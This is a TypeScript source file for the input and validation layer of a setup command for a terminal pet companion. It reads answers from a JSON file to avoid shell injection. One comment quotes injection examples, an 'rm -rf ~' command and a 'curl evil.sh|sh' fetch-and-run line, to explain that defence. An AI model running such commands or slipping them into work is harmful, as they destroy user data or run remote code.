// SPDX-License-Identifier: LicenseRef-PolyForm-Perimeter-1.0.1
// Copyright (c) 2026 Jiaqi Duan
//
// The configure kernel's INPUT layer: how the four pet answers get in, and what
// makes an answer legal. Kept out of configure.ts (the write kernel) so the two
// concerns — "is this input trustworthy" and "how do the files get written" —
// can be read and tested apart.
import { readFile } from "node:fs/promises";
import type { DialSet } from "../brain/personality";
import { listSpeciesNames } from "../face/species";

export interface ConfigureOptions {
  name: string;
  species: string;
  lang: string;
  /**
   * A named personality PRESET (see PERSONALITY_PRESETS). Optional now that the
   * conversational setup can hand over raw dials instead: it is only consulted
   * — and only validated — when `dials` is ABSENT. Kept for CI / the old cards.
   */
  personality: string;
  /**
   * The five dials, verbatim. This is how the CONVERSATIONAL /siltpoke-setup
   * delivers a custom / random / quiz result — the model already resolved every
   * mode down to five numbers, so the kernel takes them directly instead of
   * re-deriving them from a preset name it does not have. Wins over
   * `personality` when both are present (see dialsFor in configure.ts).
   */
  dials?: DialSet;
  /** --statusline: swap ~/.claude/settings.json's statusLine to the shim. */
  statusline: boolean;
  /** --daemon: install the launchd/systemd autostart unit. */
  daemon: boolean;
}

/** The five dial keys, in canonical order. The allow-list validateOptions checks a `dials` object against. */
export const DIAL_KEYS = [
  "snark",
  "patience",
  "rigor",
  "chattiness",
  "curiosity",
] as const;

/**
 * The five dials, per personality card the setup command offers. The old TTY
 * wizard reached these numbers through ~20 questions; the cards collapse that
 * to one pick, so each pick has to name a full dial set.
 *
 * This table is also the ALLOW-LIST validateOptions() checks against — the six
 * keys here are exactly the six /siltpoke-setup may offer.
 */
export const PERSONALITY_PRESETS: Record<string, DialSet> = {
  sassy: { snark: 8, patience: 3, rigor: 6, chattiness: 6, curiosity: 7 },
  gentle: { snark: 1, patience: 9, rigor: 5, chattiness: 7, curiosity: 6 },
  deadpan: { snark: 6, patience: 6, rigor: 8, chattiness: 2, curiosity: 4 },
  cheerful: { snark: 2, patience: 7, rigor: 5, chattiness: 8, curiosity: 8 },
  rigorous: { snark: 3, patience: 6, rigor: 10, chattiness: 3, curiosity: 6 },
  quiet: { snark: 3, patience: 7, rigor: 7, chattiness: 1, curiosity: 4 },
};

/** Bad user input (unknown species, unreadable answers file) — not a crash. */
export class ConfigureInputError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "ConfigureInputError";
  }
}

function flagValue(argv: string[], flag: string): string {
  const i = argv.indexOf(flag);
  return i >= 0 ? (argv[i + 1] ?? "") : "";
}

/** Flags in. Pure — no validation here; validateOptions() is the gate. */
export function parseArgs(argv: string[]): ConfigureOptions {
  const get = (flag: string): string => flagValue(argv, flag);
  return {
    name: get("--name"),
    species: get("--species"),
    lang: get("--lang"),
    personality: get("--personality"),
    statusline: argv.includes("--statusline"),
    daemon: argv.includes("--daemon"),
  };
}

/** `--answers-file <path>`, or null when the flag is absent. */
export function answersFilePath(argv: string[]): string | null {
  const p = flagValue(argv, "--answers-file");
  return p.length > 0 ? p : null;
}

/**
 * Read the four pet answers out of a JSON file instead of argv.
 *
 * WHY THIS EXISTS — shell injection. /siltpoke-setup collects `name`, `species`,
 * `lang` and `personality` from the user, and ALL FOUR can be free-typed (name
 * always is; AskUserQuestion's "Other" escape free-types the rest). It then has
 * to get them into this process. If the model interpolates them into a
 * double-quoted bash string, a name of `"; rm -rf ~; #` or `` `curl evil.sh|sh` ``
 * is executed by the user's shell. "Tell the model to sanitize first" is a SOFT
 * defense — it is prose, and prose does not stop a careless or coaxed run.
 *
 * So the shell never sees user data at all: the model writes the answers with the
 * Write tool (which does not go through a shell), and the command line carries
 * only one fixed, model-known path. Whatever bytes are in that file are DATA, and
 * JSON.parse is the only thing that ever looks at them.
 *
 * The individual flags stay for CI and headless installs, where the caller is a
 * script and not a language model relaying user text.
 *
 * `--statusline` / `--daemon` may come from either the flags or booleans in the
 * file; both are fixed literals, never user text.
 */
export async function readAnswersFile(
  path: string,
  argv: string[] = [],
): Promise<ConfigureOptions> {
  let raw: string;
  try {
    raw = await readFile(path, "utf8");
  } catch {
    throw new ConfigureInputError(`cannot read --answers-file ${path}`);
  }
  let parsed: unknown;
  try {
    parsed = JSON.parse(raw);
  } catch {
    throw new ConfigureInputError(`--answers-file ${path} is not valid JSON`);
  }
  if (parsed === null || typeof parsed !== "object" || Array.isArray(parsed)) {
    throw new ConfigureInputError(`--answers-file ${path} must contain a JSON object`);
  }
  const a = parsed as Record<string, unknown>;
  const str = (k: string): string => (typeof a[k] === "string" ? (a[k] as string) : "");
  // `dials`, when present, is carried through AS-IS (numbers, or garbage the
  // model produced) — validateOptions is the single gate that rejects a
  // non-integer or out-of-range value, so the runtime never re-validates twice.
  const rawDials = a.dials;
  const dials =
    rawDials !== null && typeof rawDials === "object" && !Array.isArray(rawDials)
      ? (rawDials as DialSet)
      : undefined;
  return {
    name: str("name"),
    species: str("species"),
    // The conversational setup writes the key as `language` (the config schema's
    // own spelling); the older cards / CI used `lang`. Accept EITHER, preferring
    // `language`, so neither producer silently lands an empty speaking-language.
    lang: str("language") || str("lang"),
    personality: str("personality"),
    ...(dials ? { dials } : {}),
    statusline: a.statusline === true || argv.includes("--statusline"),
    daemon: a.daemon === true || argv.includes("--daemon"),
  };
}

/**
 * Reject a species / personality the runtime does not have.
 *
 * Both lookups downstream are `TABLE[key] ?? DEFAULT` (dialsFor in configure.ts,
 * getSpecies in face/species.ts), so an unknown key does not error — it SILENTLY
 * hands the user a different pet than the one they picked, and the only thing
 * standing between them and that was "the model does not typo". A setup command
 * that quietly gives you the wrong pet is worse than one that says "I don't know
 * that species". Fail before anything is written.
 */
export function validateOptions(opts: ConfigureOptions): void {
  if (opts.name.trim().length === 0) {
    throw new ConfigureInputError("missing --name: the pet needs a name");
  }
  const species = listSpeciesNames();
  if (!species.includes(opts.species)) {
    throw new ConfigureInputError(
      `unknown species "${opts.species}" — valid species: ${species.join(", ")}`,
    );
  }

  // Precedence: explicit dials WIN. When present they are the whole answer, so
  // the preset name is neither needed nor validated (the conversational setup
  // sends dials for custom/random/quiz and leaves `personality` empty). Each
  // dial must be an integer 0..10 — an out-of-range value would otherwise be
  // written straight into config.json and hand the user an off-scale pet.
  if (opts.dials !== undefined) {
    // The static type says `number`, but these values were cast straight from
    // JSON in readAnswersFile — at runtime they can be anything. Re-check as
    // `unknown` so the guard is real, not just a type-level no-op.
    const raw = opts.dials as unknown as Record<string, unknown>;
    for (const k of DIAL_KEYS) {
      const v = raw[k];
      if (typeof v !== "number" || !Number.isInteger(v) || v < 0 || v > 10) {
        throw new ConfigureInputError(
          `dial "${k}" must be an integer 0..10 — got ${JSON.stringify(v)}`,
        );
      }
    }
    // Language is intentionally NOT hard-rejected: expandLanguage() falls
    // through gracefully for any code, so the pet can speak a locale the table
    // does not name. Whatever was passed is written as-is.
    return;
  }

  // Species-default mode sends NEITHER dials NOR a preset name: an empty
  // personality is the signal to let the kernel apply this species' own default
  // profile (dialsFor → speciesDefaults). Only a NON-empty personality that is
  // not a known preset is a typo worth rejecting.
  if (opts.personality.length === 0) return;

  const personalities = Object.keys(PERSONALITY_PRESETS);
  if (!personalities.includes(opts.personality)) {
    throw new ConfigureInputError(
      `unknown personality "${opts.personality}" — valid personalities: ${personalities.join(", ")}`,
    );
  }
}
